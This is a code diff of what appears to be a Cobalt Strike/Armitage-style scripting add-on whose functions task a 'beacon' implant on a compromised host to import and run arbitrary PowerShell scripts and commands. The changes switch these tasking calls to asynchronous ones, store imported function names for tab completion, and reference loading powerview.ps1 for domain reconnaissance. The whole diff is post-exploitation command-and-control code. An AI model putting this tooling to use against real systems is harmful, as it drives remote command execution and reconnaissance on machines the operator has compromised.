@@ -13,25 +13,55 @@ import javax.swing.table.*;
 import table.*;
 import cloudstrike.*;
 
-# task our our beacon to import the specified powershell script
+# task beacon to do our bidding...
+sub taskit {
+  call_async($mclient, "beacon.task", $1, $2, lhost());
+  call_async($mclient, "beacon.task", $1, $3, lhost());
+  call_async($mclient, "beacon.log_write", $1, "[*] $4 $+ \n");
+}
+
+sub _extractFunctions {
+  local('$line @r');
+  foreach $line (split("\n", $1)) {
+    $line = ["$line" trim];
+    if ($line ismatch '\s*function ([a-zA-Z0-9-]*).*?') {
+      push(@r, matched()[0]);
+    }
+  }
+
+  return @r;
+}
+
 sub task_powershell_import {
     # task ID ($1) with powershell command + args ($2)
     local('$id $len');
     $id = $1;
     $data = $2;
     $len = strlen($data);
+    
+    # store our powershell functions [for tab completion purposes]
+    call_async($mclient, "beacon.set_psh_functions", $id, join(" ", _extractFunctions($data)));
+
     # task beacon to import the PowerShell script
-    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
-    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
-}
-# task our beacon to execute a given powershell command
-sub task_powershell {
-    $id = $1;
-    $len  = strlen($2);
-    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
-    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+    call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
+    call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to import $2 $+ \n");
 }
 
+sub task_powershell {
+  $id = $1;
+  $len  = strlen($2);
+
+  call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
+  call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+}
+
+# task our beacon to execute a given powershell command
+# sub task_powershell {
+#     $id = $1;
+#     $len  = strlen($2);
+#     call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
+#     call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+# }
 sub task_get_dom {
    $beacon_id = $1;
    $script_source = script_resource("powerview.ps1");
